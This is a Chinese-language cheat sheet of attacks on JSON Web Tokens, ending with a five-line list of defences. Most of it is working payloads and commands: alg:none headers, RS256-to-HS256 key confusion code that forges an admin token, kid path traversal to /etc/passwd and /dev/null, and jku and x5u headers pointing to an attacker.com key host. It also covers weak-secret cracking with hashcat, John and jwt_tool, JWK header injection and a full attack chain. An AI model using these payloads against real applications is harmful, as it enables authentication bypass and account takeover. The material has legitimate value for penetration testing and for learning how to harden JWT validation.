# JWT详细分类

## 1. JWT基础

### JWT结构

```
Header.Payload.Signature
```

### 解码

```bash
# jwt.io
echo "TOKEN" | cut -d'.' -f1 | base64 -d
```

---

## 2. None算法攻击 (alg:none)

```json
{"alg":"none","typ":"JWT","payload":"..."}
{"alg":"None","typ":"JWT","payload":"..."}
{"alg":"NONE","typ":"JWT","payload":"..."}
```

---

## 3. 密钥混淆攻击 (RS256 -> HS256)

### 步骤

1. 获取公钥
2. 将公钥作为HMAC密钥签名
3. 将alg改为HS256

### Python示例

```python
import jwt

public_key = open("public.pem").read()
payload = {"user": "admin", "role": "admin"}

# 使用公钥作为HMAC密钥
token = jwt.encode(payload, public_key, algorithm="HS256")
print(token)
```

---

## 4. KID注入

```json
{"alg":"HS256","typ":"JWT","kid":"../../../../../dev/null"}
{"alg":"HS256","typ":"JWT","kid":"key-1"}
{"alg":"HS256","typ":"JWT","kid":"../../../etc/passwd"}
```

---

## 5. jku注入

```json
{
  "alg": "RS256",
  "typ": "JWT",
  "jku": "http://attacker.com/jwk.json"
}
```

### 恶意JWK

```json
{
  "kty": "oct",
  "k": "YXJj",
  "alg": "HS256"
}
```

---

## 6. x5u注入

```json
{
  "alg": "RS256",
  "typ": "JWT",
  "x5u": "http://attacker.com/cert.pem"
}
```

---

## 7. 弱密钥爆破

### 使用hashcat

```bash
hashcat -m 16500 jwt.txt wordlist.txt
```

### 使用jwt_tool

```bash
python3 jwt_tool.py TOKEN -C -d wordlist.txt
```

### 使用John

```bash
jwt2john.py jwt.txt > hash.txt
john --wordlist=wordlist.txt hash.txt
```

---

## 8. JWK密钥注入

```json
{
  "alg": "RS256",
  "typ": "JWT",
  "jwk": {
    "kty": "RSA",
    "n": "...",
    "e": "AQAB",
    "alg": "RS256"
  }
}
```

---

## 9. 常用工具

```bash
# jwt_tool
python3 jwt_tool.py TOKEN -C -d wordlist.txt
python3 jwt_tool.py TOKEN -X -k public.pem
python3 jwt_tool.py TOKEN --at

# jwt.io
# 在线解码和构造

# c-jwt-cracker
./c-jwt-cracker -t TOKEN -w wordlist.txt
```

---

## 10. 攻击示例

### 完整攻击链

```bash
# 1. 解码JWT
echo "TOKEN" | cut -d'.' -f1 | base64 -d

# 2. 尝试none算法
python3 jwt_tool.py TOKEN -X a

# 3. 密钥混淆
python3 jwt_tool.py TOKEN -X s -pr public.pem

# 4. 爆破弱密钥
python3 jwt_tool.py TOKEN -C -d wordlist.txt
```

---

## 11. 防御措施

- 使用强密钥
- 验证算法
- 检查密钥来源
- 使用JWKS
- 设置过期时间
